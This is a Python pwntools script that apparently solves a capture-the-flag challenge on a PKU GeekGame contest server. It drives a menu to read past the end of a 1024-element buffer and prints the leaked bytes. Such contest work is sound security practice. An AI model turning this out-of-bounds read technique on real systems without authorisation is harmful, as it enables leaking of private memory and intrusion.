from pwn import *

TOKEN = b'<token_is_deleted>'


def main():
    c = remote("prob8.geekgame.pku.edu.cn", 10008)
    c.sendline(TOKEN)
    c.recv(8192)
    c.recv(8192)

    def send(b):
        c.sendline(b)
        print("Send: ", b.decode())
        x = c.recv(8192)
        print(x.decode())
        if b'Result:' in x:
            y = x[x.find(b'Result: ') + 8:]
            ttt = bytearray()
            for i in y:
                if i == 10:
                    break
                ttt.append(i)
            data.append(int(bytes(ttt)))
        time.sleep(0.01)

    def write(index):
        send(b'3')
        send(b'0')
        send(bytes(str(index), encoding='utf-8'))
        send(b'1')
        send(b'1')

    send(b'1')
    send(b'3')  # BOX: 1, GLOBAL: 2, LOCAL: 3
    send(b'1024')
    send(b'3')

    data = []

    for i in range(1024, 1043):
        write(i)

    print(data)
    print(bytes(data))
    print(bytes(data).hex())

    send(b'^D')

    c.interactive()

    # x = c.recv(8192 * 4).decode()
    # print(x)

    c.clean()
    c.close()


if __name__ == "__main__":
    main()


# c.interactive()
